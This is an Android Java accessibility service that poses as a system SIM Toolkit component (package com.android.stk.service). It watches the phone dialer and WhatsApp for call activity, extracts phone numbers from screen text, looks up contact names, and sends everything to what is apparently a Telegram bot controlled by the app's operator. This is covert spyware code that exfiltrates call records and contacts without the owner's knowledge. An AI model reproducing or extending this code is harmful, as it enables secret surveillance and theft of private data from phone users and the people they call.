package com.android.stk.service;

import android.accessibilityservice.AccessibilityService;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.view.accessibility.AccessibilityEvent;

public class MyAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (event == null || event.getPackageName() == null || event.getText() == null) return;

            String pkg = event.getPackageName().toString().toLowerCase();
            String text = event.getText().toString();

            // Deteksi aplikasi Telepon
            if (pkg.contains("dialer") || pkg.contains("phone")) {
                if (text.contains("Menelepon") || text.contains("Calling") || text.contains("Memanggil")
                        || text.contains("Berdering") || text.contains("Ringing")) {
                    TelegramSender.sendText("📞 Panggilan keluar / berdering terdeteksi\n" + text);
                } else if (text.contains("Menjawab") || text.contains("Incoming") || text.contains("Masuk")) {
                    TelegramSender.sendText("📲 Panggilan masuk terdeteksi\n" + text);
                }
            }

            // Deteksi panggilan WhatsApp
            if (pkg.contains("whatsapp") && text.toLowerCase().contains("calling")) {
                TelegramSender.sendText("📞 WhatsApp Call terdeteksi\n" + text);
            }

            // Deteksi kontak dari nomor
            if (text.matches(".*\\d{7,}.*")) {
                String number = extractPhoneNumber(text);
                String contactName = getContactName(number);
                if (contactName != null) {
                    TelegramSender.sendText("👤 Kontak: " + contactName + "\n📱 Nomor: " + number);
                }
            }

        } catch (Exception e) {
            TelegramSender.sendText("❌ Aksesibilitas error: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {
        // Tidak digunakan
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        try {
            TelegramSender.sendText("🟢 SIM Toolkits: Accessibility Service aktif.");
        } catch (Exception ignored) {}
    }

    private String getContactName(String phoneNumber) {
        try {
            Cursor cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_FILTER_URI.buildUpon()
                            .appendPath(phoneNumber).build(),
                    new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME},
                    null, null, null);

            if (cursor != null && cursor.moveToFirst()) {
                String name = cursor.getString(0);
                cursor.close();
                return name;
            }
        } catch (Exception ignored) {}
        return null;
    }

    private String extractPhoneNumber(String text) {
        return text.replaceAll("[^0-9+]", "").trim();
    }
}
